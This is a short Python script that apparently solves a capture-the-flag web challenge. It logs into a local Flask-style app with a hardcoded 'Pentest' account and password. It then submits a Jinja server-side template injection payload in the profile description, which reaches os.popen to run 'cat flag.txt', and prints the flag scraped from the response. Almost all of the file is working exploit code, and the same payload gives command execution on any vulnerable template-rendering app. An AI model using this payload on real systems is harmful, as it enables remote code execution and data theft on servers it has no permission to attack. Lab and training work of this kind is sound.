#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup

HOST = "127.0.0.1"
PORT = "5000"


def url(path):
    return f"http://{HOST}:{PORT}/{path}"

def solve():
    # Create session
    s = requests.session()
    # Login to application
    print("[+] Login with Pentest account")
    r = s.post(url("login"), data={
        "username": "Pentest",
        "password": "YAdmin2024#"
    })

    if r.status_code != 200:
        print("[-] Authentication error")
        print(r.text)
        return

    # Send payload to trigger SSTI
    payload = "request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()"
    print("[+] Send payload in description parameter")
    r = s.post(url("profile"), data={
        "desc": "{{ %s }}" % payload
    })

    # Show flag
    soup = BeautifulSoup(r.text, 'html.parser')
    print("[+] Flag is here:")
    print(soup.find("div", {"class": "connected"}))


if __name__ == "__main__":
    solve()
